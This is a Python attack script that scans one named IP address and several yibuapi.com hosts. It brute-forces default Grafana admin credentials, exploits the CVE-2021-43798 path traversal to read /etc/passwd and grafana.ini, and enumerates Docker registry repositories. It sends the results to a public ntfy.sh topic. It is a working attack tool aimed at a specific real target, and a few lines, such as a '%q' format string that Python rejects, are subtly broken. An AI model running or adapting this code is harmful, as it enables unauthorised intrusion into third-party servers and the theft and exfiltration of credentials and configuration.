#!/usr/bin/env python3
# i45456 ops host probe: runs on a fresh GHA runner EIP, probes 54.36.150.244
# across many ports + vhosts, fingerprints GitLab/Grafana/Registry/Jenkins/Zabbix,
# and runs read-only attack probes. Reports compact summary to stdout + ntfy.
import os, sys, socket, ssl, json, re, time, urllib.request

TARGET = os.environ.get("TARGET", "54.36.150.244")
JOB = os.environ.get("JOB", "0")
TOPIC = os.environ.get("TOPIC", "iops254-7c1e")
VHOSTS = ["gitlab.yibuapi.com", "registry.yibuapi.com", "grafana.yibuapi.com",
          "jenkins.yibuapi.com", "zabbix.yibuapi.com", "dl.yibuapi.com", "yibuapi.com"]
PORTS = [22, 80, 443, 3000, 3001, 3100, 5000, 8080, 8443, 9090, 9091, 9092, 9093,
         9000, 5601, 9200, 2375, 6443, 10250, 10080, 18080, 8000, 8081, 8888, 9418, 53]

def log(*a):
    print(" ".join(str(x) for x in a), flush=True)

def send(tag, text):
    text = str(text)
    for i in range(0, len(text), 3800):
        try:
            req = urllib.request.Request("https://ntfy.sh/" + TOPIC,
                data=((("[j%s %d] " % (JOB, i//3800+1)) + text[i:i+3800]).encode("utf-8", "replace")),
                method="POST", headers={"Title": ("i45456-" + tag)[:60]})
            urllib.request.urlopen(req, timeout=12).read()
        except Exception as e:
            log("NTFYERR", str(e)[:80])

def egress():
    for u in ("https://api.ipify.org", "https://ifconfig.me/ip", "https://icanhazip.com"):
        try:
            return urllib.request.urlopen(u, timeout=10).read().decode().strip()
        except Exception:
            pass
    return "ERR"

def tcp_open(ip, port, t=2.5):
    try:
        s = socket.create_connection((ip, port), timeout=t)
        s.close(); return True
    except Exception:
        return False

def http_req(ip, port, host, path="/", tls=False, timeout=8, method="GET", body=None, extra=None):
    s = None
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        if tls:
            ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        hdr = "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) probe\r\nAccept: */*\r\nConnection: close\r\n" % (method, path, host)
        if extra:
            for k, v in extra.items(): hdr += "%s: %s\r\n" % (k, v)
        if body is not None:
            b = body.encode() if isinstance(body, str) else body
            hdr += "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n" % len(b)
            raw = hdr.encode() + b"\r\n" + b
        else:
            raw = hdr.encode() + b"\r\n"
        s.sendall(raw)
        data = b""
        while True:
            ch = s.recv(8192)
            if not ch: break
            data += ch
            if len(data) > 60000: break
        head, _, bd = data.partition(b"\r\n\r\n")
        lines = head.decode("latin-1", "replace").split("\r\n")
        status = 0
        try: status = int(lines[0].split()[1])
        except Exception: pass
        headers = {}
        for ln in lines[1:]:
            if ":" in ln:
                k, v = ln.split(":", 1); headers[k.strip().lower()] = v.strip()
        return {"status": status, "headers": headers, "body": bd, "bodylen": len(bd)}
    except Exception as e:
        return {"status": 0, "headers": {}, "body": b"", "bodylen": 0, "err": str(e)[:80]}
    finally:
        try:
            if s: s.close()
        except Exception: pass

def title(body):
    try:
        m = re.search(rb"<title[^>]*>(.*?)</title>", body, re.I | re.S)
        if m: return m.group(1).decode("utf-8", "replace").strip()[:80]
    except Exception: pass
    return ""

def snippet(body, n=160):
    try:
        return body[:n].decode("utf-8", "replace").replace("\n", " ").replace("\r", " ").strip()
    except Exception:
        return ""

# ---------- deep attack probes (read-only + minimal) ----------
def probe_gitlab(ip, port, host, tls, out):
    log(">> GITLAB deep %s:%s host=%s tls=%s" % (ip, port, host, tls))
    for p in ["/users/sign_in", "/users/sign_up", "/explore", "/api/v4/version", "/-/health", "/help"]:
        r = http_req(ip, port, host, p, tls=tls)
        loc = r["headers"].get("location", "")
        log("GL %s -> %s len=%d loc=%s title=%s" % (p, r["status"], r["bodylen"], loc, title(r["body"])))
        out.append("GL %s %s len=%d loc=%s t=%s %s" % (p, r["status"], r["bodylen"], loc, title(r["body"]), snippet(r["body"], 120)))
        if p == "/api/v4/version" and r["status"] == 200:
            out.append("GL_VERSION " + snippet(r["body"], 200))
    # version from body of /help
    r = http_req(ip, port, host, "/help", tls=tls)
    m = re.search(rb"(GitLab[^<]{0,40}?\d+\.\d+\.\d+)", r["body"])
    if m: out.append("GL_VER_BODY " + m.group(1).decode("latin-1", "replace")[:60])

def probe_grafana(ip, port, host, tls, out):
    log(">> GRAFANA deep %s:%s host=%s tls=%s" % (ip, port, host, tls))
    r = http_req(ip, port, host, "/api/health", tls=tls)
    log("GF /api/health -> %s %s" % (r["status"], snippet(r["body"], 160)))
    out.append("GF /api/health %s %s" % (r["status"], snippet(r["body"], 200)))
    # default admin:admin / admin:prom-operator
    for cred in [("admin", "admin"), ("admin", "prom-operator"), ("admin", "grafana")]:
        r = http_req(ip, port, host, "/login", tls=tls, method="POST",
                     body="user=%s&password=%s" % cred, extra={"Content-Type": "application/x-www-form-urlencoded"})
        ok = (r["status"] == 200 and (b"Logged in" in r["body"] or b'"message":"Logged in"' in r["body"]))
        log("GF login %s:%s -> %s ok=%s %s" % (cred[0], cred[1], r["status"], ok, snippet(r["body"], 120)))
        out.append("GF_LOGIN %s:%s status=%s ok=%s %s" % (cred[0], cred[1], r["status"], ok, snippet(r["body"], 100)))
        if ok:
            # read settings (contains db/security config)
            rc = http_req(ip, port, host, "/api/admin/settings", tls=tls)
            out.append("GF_SETTINGS %s len=%d %s" % (rc["status"], rc["bodylen"], snippet(rc["body"], 400)))
            break
    # CVE-2021-43798 path traversal (v8.0.0-8.3.0): read /etc/passwd
    for plug in ["alertlist", "graphite", "prometheus"]:
        p = "/public/plugins/%s/../../../../../../../../etc/passwd" % plug
        r = http_req(ip, port, host, p, tls=tls)
        if b"root:" in r["body"]:
            log("GF CVE-2021-43798 HIT via %s" % plug)
            out.append("GF_CVE_2021_43798 HIT %s status=%s %s" % (plug, r["status"], snippet(r["body"], 300)))
            # try grafana.ini
            p2 = "/public/plugins/%s/../../../../../../../../etc/grafana/grafana.ini" % plug
            r2 = http_req(ip, port, host, p2, tls=tls)
            if r2["bodylen"] > 0:
                out.append("GF_INI %s %s" % (r2["status"], snippet(r2["body"], 800)))
            break
        else:
            out.append("GF_CVE_2021_43798 %s status=%s len=%d" % (plug, r["status"], r["bodylen"]))

def probe_registry(ip, port, host, tls, out):
    log(">> REGISTRY deep %s:%s host=%s tls=%s" % (ip, port, host, tls))
    r = http_req(ip, port, host, "/v2/", tls=tls)
    out.append("REG /v2/ %s hdr=%s %s" % (r["status"], r["headers"].get("docker-distribution-api-version", ""), snippet(r["body"], 120)))
    r = http_req(ip, port, host, "/v2/_catalog", tls=tls)
    out.append("REG /v2/_catalog %s %s" % (r["status"], snippet(r["body"], 600)))
    if r["status"] == 200:
        try:
            cat = json.loads(r["body"])
            repos = cat.get("repositories", [])[:15]
            for repo in repos:
                rt = http_req(ip, port, host, "/v2/%s/tags/list" % repo, tls=tls)
                out.append("REG tags %s -> %s %s" % (repo, rt["status"], snippet(rt["body"], 300)))
        except Exception as e:
            out.append("REG catalog parse err %s" % str(e)[:80])

def probe_jenkins(ip, port, host, tls, out):
    log(">> JENKINS deep %s:%s host=%s tls=%s" % (ip, port, host, tls))
    r = http_req(ip, port, host, "/", tls=tls)
    out.append("JK / %s hdr=%s loc=%s t=%s" % (r["status"], r["headers"].get("location", ""), title(r["body"])))
    r = http_req(ip, port, host, "/api/json", tls=tls)
    out.append("JK /api/json %s len=%d" % (r["status"], r["bodylen"]))
    r = http_req(ip, port, host, "/jnlpJars/jenkins-cli.jar", tls=tls)
    out.append("JK cli.jar %s len=%d ct=%s" % (r["status"], r["bodylen"], r["headers"].get("content-type", "")))

def probe_zabbix(ip, port, host, tls, out):
    log(">> ZABBIX %s:%s host=%s tls=%s" % (ip, port, host, tls))
    r = http_req(ip, port, host, "/index.php", tls=tls)
    out.append("ZB index %s t=%s %s" % (r["status"], title(r["body"]), snippet(r["body"], 120)))

def classify_and_deep(ip, port, host, tls, out):
    r = http_req(ip, port, host, "/", tls=tls)
    body = r["body"].lower()
    srv = r["headers"].get("server", "")
    t = title(r["body"]).lower()
    key = "%s:%s/%s/%s" % (ip, port, host, "https" if tls else "http")
    log("HTTP %s -> %s srv=%s t=%s len=%d" % (key, r["status"], srv, title(r["body"]), r["bodylen"]))
    out.append("HTTP %s %s srv=%q t=%s len=%d loc=%s" % (key, r["status"], srv, title(r["body"]), r["bodylen"], r["headers"].get("location", "")))
    if r["status"] == 0:
        return
    if b"gitlab" in body or "gitlab" in srv.lower() or "gitlab" in t:
        probe_gitlab(ip, port, host, tls, out)
    elif b"grafana" in body or "grafana" in t:
        probe_grafana(ip, port, host, tls, out)
    elif b"docker-distribution" in body or "docker" in srv.lower():
        probe_registry(ip, port, host, tls, out)
    elif b"jenkins" in body or "jenkins" in srv.lower() or "jenkins" in t:
        probe_jenkins(ip, port, host, tls, out)
    elif b"zabbix" in body or "zabbix" in t:
        probe_zabbix(ip, port, host, tls, out)
    elif b'"repositories"' in body or b"docker-distribution" in r["headers"].get("docker-distribution-api-version", "").lower() and False:
        probe_registry(ip, port, host, tls, out)

def main():
    t0 = time.time()
    log("RUN job=%s target=%s ts=%s" % (JOB, TARGET, time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())))
    eg = egress(); log("EGRESS", eg)
    out = []
    # 1) TCP port scan
    openp = []
    for p in PORTS:
        if tcp_open(TARGET, p):
            openp.append(p)
    log("OPEN_PORTS", openp)
    summary = "job=%s egress=%s open=%s" % (JOB, eg, openp)
    if not openp:
        send("summary", summary + " (no open ports)")
        log("DONE no open ports t=%.1f" % (time.time()-t0))
        return
    # 2) For each open port, probe likely vhosts. Prioritize web ports.
    webports = [p for p in openp if p not in (22, 53, 2375, 2376, 6443, 10250)]
    # For each vhost, try relevant scheme on each web port (cap work)
    for p in webports:
        # pick tls if 443/8443 else try http then https
        tries = []
        if p in (443, 8443):
            tries = [(True,), (False,)]
        else:
            tries = [(False,), (True,)]
        for vh in VHOSTS:
            for (tls,) in tries:
                # only try a scheme once per port if it clearly fails fast is fine
                classify_and_deep(TARGET, p, vh, tls, out)
    # dump the collected detail to stdout (pull via logs)
    log("=" * 30 + " DETAIL " + "=" * 30)
    for line in out:
        log("D| " + line)
    hits = [l for l in out if any(k in l for k in ("GL_VERSION", "_HIT", "GF_LOGIN .* ok=True", "GF_SETTINGS", "REG /v2/_catalog 200", "JK cli.jar 200", "/v2/ 200"))]
    log("HITS", len(hits))
    # push compact summary + hits to ntfy
    msg = summary + "\n" + ("\n".join(hits[:40]) if hits else "(no deep hits)")
    send("summary", msg)
    log("DONE job=%s t=%.1f" % (JOB, time.time()-t0))

if __name__ == "__main__":
    main()
